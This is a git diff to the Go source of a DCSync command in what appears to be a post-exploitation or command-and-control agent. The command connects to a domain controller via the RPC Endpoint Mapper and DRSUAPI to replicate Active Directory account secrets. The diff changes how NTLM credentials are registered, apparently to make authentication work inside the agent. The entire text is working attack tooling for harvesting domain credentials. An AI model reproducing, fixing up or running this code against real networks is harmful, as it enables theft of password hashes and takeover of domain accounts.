@@ -19,7 +19,6 @@ import (
 	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
 	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
 	"github.com/oiweiwei/go-msrpc/ndr"
-	"github.com/oiweiwei/go-msrpc/ssp"
 	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
 
 	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
@@ -100,25 +99,22 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: no valid target accounts specified")
 	}
 
-	// Set up credentials
+	// Set up credentials — use global registration (matching official drsr example).
+	// Per-context credentials fail in the agent context due to security context
+	// state interference from other command init() registrations.
 	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
 	zeroCredentials(&args.Password, &args.Hash)
 	if credErr != nil {
 		return errorf("Error: %v", credErr)
 	}
+	gssapi.AddCredential(cred)
 
-	// Create context with NTLM only (no SPNEGO) — bypasses SPNEGO negotiation
-	// which may be causing the auth failure. Direct NTLM (AuthType 10) is simpler.
 	ctx, cancel := context.WithTimeout(
-		gssapi.NewSecurityContext(context.Background(),
-			gssapi.WithCredential(cred),
-			gssapi.WithMechanismFactory(ssp.NTLM),
-		),
+		gssapi.NewSecurityContext(context.Background()),
 		time.Duration(args.Timeout)*time.Second,
 	)
 	defer cancel()
 
-	// Connect via EPM (Endpoint Mapper, port 135)
 	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
 		epm.EndpointMapper(ctx,
 			net.JoinHostPort(args.Server, "135"),
@@ -129,8 +125,6 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	defer cc.Close(ctx)
 
-	// Create DRSUAPI client — WithSeal only; credentials and NTLM mechanism
-	// are on the ctx. No SecurityContextOptions means NewSecurity uses ctx directly.
 	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal())
 	if err != nil {
 		return errorf("Error creating DRSUAPI client: %v", err)
